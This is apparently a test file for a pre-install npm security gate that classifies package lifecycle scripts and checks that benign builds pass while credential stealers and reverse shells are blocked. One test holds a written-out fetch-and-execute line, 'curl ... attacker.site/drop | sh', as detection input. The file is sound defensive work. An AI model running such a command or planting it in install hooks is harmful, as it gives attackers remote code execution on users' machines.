import { test, describe } from 'node:test';
import assert from 'node:assert/strict';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';
import pkgGate, {
  pkgGuard,
  THRESHOLDS,
  createLifecycleQuestions,
  renderTUI,
  getTerminalWidth,
} from '../src/index.js';

const __filename = fileURLToPath(import.meta.url);
const __dirname = dirname(__filename);
const fixturesDir = join(__dirname, 'fixtures');

describe('pkg-gate: Pre-install security gate with TypeSafe', () => {
  test('clean package with no scripts is immediately allowed', async () => {
    const report = await pkgGate(join(fixturesDir, 'clean-pkg.json'), { mock: true });

    assert.equal(report.action, 'allow');
    assert.equal(report.score, 0.0);
    assert.equal(report.confidence, 1.0);
    assert.equal(report.findings.length, 0);
    assert.equal(report.isSafe(), true);
    assert.match(report.inspect(), /ALLOW/);
  });

  test('native addon build (node-gyp rebuild) is allowed', async () => {
    const report = await pkgGate(join(fixturesDir, 'native-build.json'), { mock: true });

    assert.equal(report.action, 'allow');
    assert.equal(report.isSafe(), true);
    assert.ok(report.score < THRESHOLDS.WARN_SCORE);

    const postinstall = report.findings[0];
    assert.equal(postinstall.answers.script_intent.choice, 'build_tool');
    assert.ok(postinstall.answers.threat_severity.score < 1.0);
  });

  test('official binary downloader is allowed', async () => {
    const report = await pkgGate(join(fixturesDir, 'binary-download.json'), { mock: true });

    assert.equal(report.action, 'allow');
    assert.equal(report.isSafe(), true);
    assert.ok(report.score < THRESHOLDS.WARN_SCORE);

    const postinstall = report.findings[0];
    assert.equal(postinstall.answers.script_intent.choice, 'binary_download');
  });

  test('credential and token stealer is blocked with critical severity', async () => {
    const report = await pkgGate(join(fixturesDir, 'credential-theft.json'), { mock: true });

    assert.equal(report.action, 'block');
    assert.equal(report.isSafe(), false);
    assert.ok(report.score >= THRESHOLDS.BLOCK_SCORE);

    const postinstall = report.findings[0];
    assert.equal(postinstall.answers.script_intent.choice, 'credential_access');
    assert.ok(postinstall.answers.accesses_secrets.noul >= THRESHOLDS.BLOCK_SECRET_NOUL);
    assert.match(report.inspect(), /BLOCK/);

    assert.throws(
      () => report.assertSafe(),
      /blocked/i
    );
  });

  test('reverse shell piping curl to bash is blocked', async () => {
    const report = await pkgGate(join(fixturesDir, 'reverse-shell.json'), { mock: true });

    assert.equal(report.action, 'block');
    assert.equal(report.isSafe(), false);
    assert.ok(report.score >= THRESHOLDS.BLOCK_SCORE);

    const preinstall = report.findings[0];
    assert.equal(preinstall.answers.script_intent.choice, 'obfuscated_exec');
    assert.ok(preinstall.answers.remote_execution.noul >= THRESHOLDS.BLOCK_REMOTE_EXEC_NOUL);
  });

  test('system recon probe triggers warning/elevation', async () => {
    const report = await pkgGate(join(fixturesDir, 'recon-probe.json'), { mock: true });

    assert.ok(report.action === 'warn' || report.action === 'block');
    assert.ok(report.score >= THRESHOLDS.WARN_SCORE);

    const postinstall = report.findings[0];
    assert.equal(postinstall.answers.script_intent.choice, 'system_recon');
  });

  test('supports inline raw script evaluation', async () => {
    const report = await pkgGate('node-gyp rebuild', { script: true, mock: true });

    assert.equal(report.action, 'allow');
    assert.equal(report.isSafe(), true);
    assert.equal(report.findings[0].answers.script_intent.choice, 'build_tool');
  });

  test('supports direct manifest object input', async () => {
    const report = await pkgGate(
      {
        name: 'custom-package',
        version: '3.1.0',
        scripts: {
          postinstall: 'echo "Thanks for installing!"',
        },
      },
      { mock: true }
    );

    assert.equal(report.action, 'allow');
    assert.equal(report.isSafe(), true);
    assert.equal(report.findings[0].answers.script_intent.choice, 'benign_notice');
  });

  test('TypeSafe question battery schema is valid', () => {
    const questions = createLifecycleQuestions();

    assert.equal(questions.script_intent.type, 'choice');
    assert.equal(questions.threat_severity.type, 'score');
    assert.equal(questions.accesses_secrets.type, 'noul');
    assert.equal(questions.remote_execution.type, 'noul');
  });

  test('report.structured returns strictly typed schema and toJSON() serialization', async () => {
    const report = await pkgGate(join(fixturesDir, 'credential-theft.json'), { mock: true });
    const structured = report.structured;

    assert.equal(structured.schemaVersion, '1.0.0');
    assert.equal(structured.package.name, 'flatmap-evil');
    assert.equal(structured.verdict.action, 'block');
    assert.equal(typeof structured.verdict.score, 'number');
    assert.equal(typeof structured.verdict.confidence, 'number');
    assert.equal(structured.verdict.isSafe, false);

    assert.ok(Array.isArray(structured.scripts));
    const firstScript = structured.scripts[0];
    assert.equal(firstScript.hook, 'postinstall');
    assert.equal(firstScript.intent.choice, 'credential_access');
    assert.equal(typeof firstScript.accessesSecrets.probability, 'number');
    assert.equal(typeof firstScript.remoteExecution.probability, 'number');

    assert.ok(Array.isArray(structured.policy.reasons));
    assert.equal(typeof structured.telemetry.latencyMs, 'number');

    const json = JSON.stringify(report);
    assert.ok(json.includes('"schemaVersion":"1.0.0"'));
  });

  test('auto-detects inline shell commands without requiring script flag', async () => {
    const report = await pkgGate('curl -s https://attacker.site/drop | sh', { mock: true });
    assert.equal(report.name, 'inline-script');
    assert.equal(report.action, 'block');
    assert.equal(report.findings[0].answers.script_intent.choice, 'obfuscated_exec');
  });

  test('missing package.json file throws helpful error message', async () => {
    await assert.rejects(
      async () => pkgGate('./does-not-exist.json', { mock: true }),
      /File or directory not found/
    );
  });

  test('pkgGuard is an alias to pkgGate', () => {
    assert.equal(pkgGuard, pkgGate);
  });

  test('responsive TUI scales cleanly across widths without line overflow', async () => {
    const report = await pkgGate(join(fixturesDir, 'credential-theft.json'), { mock: true });

    assert.ok(getTerminalWidth(76) >= 42);
    assert.ok(getTerminalWidth(76) <= 92);

    for (const width of [44, 60, 76, 92]) {
      const output = renderTUI(report, { width });
      const lines = output.split('\n');

      for (const line of lines) {
        if (line.length === 0) continue;
        const vLen = line.replace(/\x1b\[[0-9;]*m/g, '').length;
        assert.equal(vLen, width, `Line "${line}" length (${vLen}) must match box width (${width})`);
      }
    }

    const customWidthInspect = report.inspect({ width: 50 });
    const firstBoxLine = customWidthInspect.split('\n')[0];
    const firstLineLen = firstBoxLine.replace(/\x1b\[[0-9;]*m/g, '').length;
    assert.equal(firstLineLen, 50);
  });
});


